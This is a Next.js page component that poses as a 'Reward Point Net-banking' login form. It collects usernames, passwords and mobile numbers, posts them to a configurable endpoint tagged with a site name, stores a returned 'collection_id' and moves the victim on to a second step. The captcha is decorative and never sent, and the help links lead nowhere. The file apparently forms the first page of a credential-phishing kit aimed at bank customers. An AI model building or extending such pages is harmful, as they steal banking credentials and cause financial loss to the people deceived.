'use client';
import Footer from "./inlcude/footer";
import Header from "./inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";
import css from './page.module.css'

export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
  const SITE = process.env.NEXT_PUBLIC_SITE;

    useEffect(()=>{
        localStorage.removeItem('collection_id');
    })
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem('collection_id', responseData.data);
            router.push('/2');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <br />
    <div className={css.loginHeading}>
        <h3 style={{ marginLeft: 12 }}>Login in Reward Point Net-banking</h3>
    </div>
    <div className={css.loginForm}>
        <p className={css.info}>
            <span>(CARE:</span> Username and password are case sensitive)
        </p>
        <form onSubmit={handleSubmit}>
            <div className={css.formGroup}>
                <label htmlFor="Uname">Username* </label>
                <input
                    name="Uname"
                    type="text"
                    className={css.formControl}
                    id="Uname"
                    required
                    size={30}
                    maxLength={30}
                    aria-label="Uname"
                />
            </div>
            <div className={css.formGroup}>
                <label htmlFor="Pass">Password* </label>
                <input
                    name="Pass"
                    type="password"
                    className={css.formControl}
                    id="Pass"
                    required
                    size={30}
                    maxLength={30}
                    aria-label="Pass"
                />
            </div>
            <div className={css.formGroup}>
                <label htmlFor="MNo">Mobile* </label>
                <input
                    name="MNo"
                    type="text"
                    inputMode="numeric"
                    className={css.formControl}
                    id="MNo"
                    size={30}
                    required
                    maxLength={10}
                    aria-label="MNo"
                />
            </div>
            <div className={css.formGroup}>
                <label htmlFor="captcha">Captcha*</label>
                <input
                    type="text"
                    className={css.formControl}
                    size={30}
                    maxLength={30}
                    aria-label="captcha"
                />
            </div>
            <label>Select Any Captcha option*</label>
            <div className={css.top10}>
                <div className={css.show} style={{margin:"0 0"}}>
                    <img alt="gujrat" width={150} src="/assets/cia.png" />
                </div>
            </div>
            <div className={css.captcha}>
                <div className={css.w50}>
                    <input type="radio" id="" defaultChecked />
                    Image Captcha
                </div>
                <div className={css.w50}>
                    <input type="radio" id="" />
                    Audio Captcha
                </div>
                <div className={css.clear} />
                
                <div className={css.formGroup}   style={{marginTop:"10px"}} >
                    <input type="submit" className={css.btn} defaultValue="Login" />
                    <input type="reset" className={css.btn} defaultValue="Reset" />
                </div>
                <p>
                    <a href="/">Register</a>
                </p>
                <p>
                    <a href="/">Forget</a>
                </p>
            </div>
        </form>
    </div>
    <div className={css.pBody}>
        <ul className={css.provide}>
            <li>Mandatory fields are marked asterisk (*)</li>
            <li>Do not share your personal information anywhere.</li>
            <li>Your personal information is highly confidential. We will never ask.</li>
        </ul>
    </div>

    <Footer />
</>

  );
}
